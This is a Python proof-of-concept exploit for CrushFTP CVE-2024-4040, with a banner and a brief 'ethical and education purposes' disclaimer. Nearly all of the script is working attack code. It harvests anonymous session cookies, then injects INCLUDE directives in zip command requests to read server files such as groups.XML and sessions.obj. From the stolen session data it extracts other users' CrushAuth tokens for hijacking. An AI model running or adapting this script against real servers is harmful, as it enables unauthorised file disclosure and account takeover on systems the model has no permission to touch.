import requests
import re
import xml.etree.ElementTree

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'

def banner():

    print(r"""

     _____ ______ _   _ _____ _   _   ________  ___
    /  __ \| ___ \ | | /  ___| | | | |  ___|  \/  |
    | /  \/| |_/ / | | \ `--.| |_| | | |__ | .  . |
    | |    |    /| | | |`--. \  _  | |  __|| |\/| |
    | \__/\| |\ \| |_| /\__/ / | | | | |___| |  | |
     \____/\_| \_|\___/\____/\_| |_/ \____/\_|  |_/

     """)
    print("CrushFTP PoC CVE-2024-4040")
    print("By @contrxl")
    print("Purely for ethical & education purposes, don't be a dick.\n")

class CrushEm(object):

    def __init__(self, stdurl = "http://127.0.0.1:9090/WebInterface/"):
        self.std = stdurl
        self.token = ""

    @property
    def currentAuth(self):
        if len(self.token) < 4:
            return ""
        return self.token[-4:]

    @property
    def setHeaders(self):
        headers = {}
        if self.token:
            headers["Cookie"] = f"CrushAuth={self.token}; currentAuth={self.currentAuth}"
            headers["user_ip"] = "127.0.0.1"
            return headers

    def post(self, subdir, data):
        headers = self.setHeaders
        if self.currentAuth:
            data["c2f"] = self.currentAuth
        r = requests.post(self.std + subdir, headers=headers, data=data)
        return r

    def sessionCheck(self):
        try:
            r = requests.get(self.std)
            print(f"{OKGREEN}[*]{ENDC} Trying to reach session at: {self.std}\n")
            if r.status_code == 404:
                print(f"{OKGREEN}[+]{ENDC} Session reachable!")
                print(f"{OKGREEN}[*]{ENDC} Trying to grab authentication tokens...\n")
                c = r.cookies.get_dict()
                if "CrushAuth" not in c:
                    raise ValueError(f"{FAIL}[-]{ENDC} CrushAuth cookie not found, anonymous access disabled.")
                print(f"{OKGREEN}[+]{ENDC} Authentication tokens grabbed!")
                self.current_auth = c['currentAuth']
                self.token = c["CrushAuth"]
                print(f"{OKGREEN}[+]{ENDC} Current Auth Session Token: {self.current_auth}")
                print(F"{OKGREEN}[+]{ENDC} Current CrushAuth Session Token: {self.token}\n")
        except requests.exceptions.RequestException as e:
            print(f"{FAIL}[-]{FAIL} Failed to reach session.")
            print(f"{FAIL}[-]{FAIL} Error: " + str(e))

    def testIt(self, command, params={}):
        data = {"command": command, "random": "3333"}
        data.update(params)
        r = self.post("/WebInterface/function", data)
        return r

    def crushIt(self):
        target = f"{self.std}/?c2f={self.current_auth}&command=zip&path=<INCLUDE>users/MainUsers/groups.XML<INCLUDE>&names=/a"
        print(f"{OKGREEN}[*]{ENDC} Beginning extract attempt on {target}")
        try:
            r = requests.post(target, headers=self.setHeaders, verify=False, allow_redirects=True)
            if r.status_code == 200 and r.text != "":
                print(f"{OKGREEN}[+]{ENDC} Extracted from target successfully!")
                print(f"{OKGREEN}[+]{ENDC} Extracted response:\n{r.text}\n")
            else:
                print(f"{FAIL}[-]{ENDC} Failed to extract from target.")
        except requests.exceptions.RequestException as e:
            print(f"{FAIL}[-]{ENDC} Error extracting from target.")
            print(f"{FAIL}[-]{ENDC} Error: " + str(e))    

    def extractSessions(self):
        target = f"{self.std}/?c2f={self.current_auth}&command=zip&path={{working_dir}}&names=/a"
        print(f"{OKGREEN}[*]{ENDC} Beginning session file extraction attempt...")
        print(f"{OKGREEN}[+]{ENDC} Attempting to ID installation directory...")
        try:
            r = requests.post(target, headers=self.setHeaders, verify=False, allow_redirects=True)
            if r.status_code ==200 and r.text != "":
                print(f"{OKGREEN}[+]{ENDC} Extracting working directory:\n{r.text}\n")
                root = xml.etree.ElementTree.fromstring(r.text)
                rtext = root.find('response').text
                matches = re.findall(r'file:(.*?)(?=\n|$)', rtext)
                if matches:
                    installed_dir = matches[-1].strip()
                    print(f"{OKGREEN}[+]{ENDC} Installation directory confirmed: {installed_dir}")
                    sessions_file = f"{installed_dir}sessions.obj"
                    print(f"{OKGREEN}[*]{ENDC} Attempting to extract {sessions_file} now...")
                    target = f"{self.std}/?c2f={self.current_auth}&command=zip&path=<INCLUDE>{sessions_file}</INCLUDE>&names=/a"
                    r = requests.post(target, headers=self.setHeaders, verify=False, allow_redirects=True)
                    if r.status_code == 200 and r.text != "":
                        print(f"{OKGREEN}[+]{ENDC} Extract succeeded!")
                        #clear_text = r.text.replace("[", "\\[").replace("]", "\\]")
                        #print(f"{OKGREEN}[+]{ENDC} Extracted response:\n{clear_text}")
                        print(f"\n{OKGREEN}[*]{ENDC} Attempting cookie extraction now...")
                        extracted_token = [cookie[:44] for cookie in re.findall(r'CrushAuth=([^;]*)', r.text)]
                        extracted_current_auth = [cookie[:4] for cookie in re.findall(r'currentAuth=([^;]*)', r.text)]
                        print(f"{OKGREEN}[+]{ENDC} Extracted CrushAuth: " + ', '.join(extracted_token))
                        print(f"{OKGREEN}[+]{ENDC} Extracted Current Auth: " + ', '.join(extracted_current_auth))
                     
        except requests.exceptions.RequestException as e:
            print(f"{FAIL}[-]{ENDC} Failed to extract sessions.")
            print(f"{FAIL}[-]{ENDC} Error: " + str(e))

def main():
    banner()
    g = CrushEm()
    try:
        g.sessionCheck()
    except ValueError:
        print(f"{FAIL}[-]{ENDC}Not vulnerable!")

    try:
        print(f"{OKGREEN}[*]{ENDC} Testing vulnerability...")
        r = g.testIt("exists", {"paths": {"{hostname}"}})
        print(f"{OKGREEN}[+]{ENDC} Exploit test successful, response: {r.text}")
    except ValueError:
        print(f"{FAIL}[-]{ENDC} Test failed!")

    try:
        g.crushIt()
    except ValueError:
        print(f"{FAIL}[-]{ENDC} Failed to crush 'em :(")

    try:
        g.extractSessions()
    except ValueError:
        print(f"{FAIL}[-]{ENDC} Extraction failed.")

if __name__ == "__main__":
    main()
